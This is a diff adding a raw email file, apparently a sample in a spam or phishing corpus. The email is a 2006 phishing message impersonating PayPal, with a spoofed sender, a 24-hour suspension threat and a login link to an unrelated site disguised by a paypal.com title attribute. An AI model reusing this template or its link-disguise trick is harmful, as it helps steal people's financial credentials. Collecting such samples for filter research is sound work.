@@ -1,0 +1,87 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 1390D2A88C
+ for <user@example.com>; Sun,  5 Feb 2006 04:46:27 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 06DF1621CB6; Sun,  5 Feb 2006 04:46:27 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id DF48E621CAB
+ for <user@example.com>; Sun,  5 Feb 2006 04:46:26 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id EAA13558
+ for user@example.com; Sun, 5 Feb 2006 04:46:26 -0500
+Received: from ambix.securesites.net (ambix.net [199.239.230.21])
+ by mail.example.com with ESMTP id EAA13550
+ for <user@example.com>; Sun, 5 Feb 2006 04:46:25 -0500
+Received: from User ([64.240.30.119]) (authenticated bits=0)
+ by ambix.securesites.net (8.13.1/8.12.6) with ESMTP id k152oM9U009238;
+ Sun, 5 Feb 2006 02:50:23 GMT (envelope-from acc-validity@paypal.com)
+Message-Id: <200602050250.k152oM9U009238@ambix.securesites.net>
+Reply-To: <no-reply@paypal.com>
+From: "PayPal" <acc-validity@paypal.com>
+Subject: Account compromised: billing information moved or changed
+Date: Sun, 5 Feb 2006 04:50:43 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1250"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 293
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="70%" border=0>
+<tr>
+<td align="left"><img src="http://www.geocities.com/slutsd/ja_logo.gif" border=0></td>
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+	<TD><font color="Navy" size="3"><b>Dear PayPal client,</b></font><br>
+	<br>
+	      <font face="Arial" size="2px">While performing it's regular scheduled monthly billing address check our system found incompatible information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of this information you still need to follow up the previous link and update your existing billing information because it means that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation.<br>
+	<br>
+	We apologies for any inconvinience this may caused you and we strongly advise you to update your information 
+you have on file with us. Please <a  href=" http://www.labs.cl/logon.html" title="https://www.paypal.com/cgi-bin/webscr?cmd=_login">login</a> in order to avoid any possible futuring billing problems with your account.<br>
+	<br>
+        <br>
+        <br>
+	<br>
+        <br>
+	<b>Best regards</b>,<br>
+	- <i>PayPal Team</i>.
+        </TD>
+        </tr>
+</TABLE>
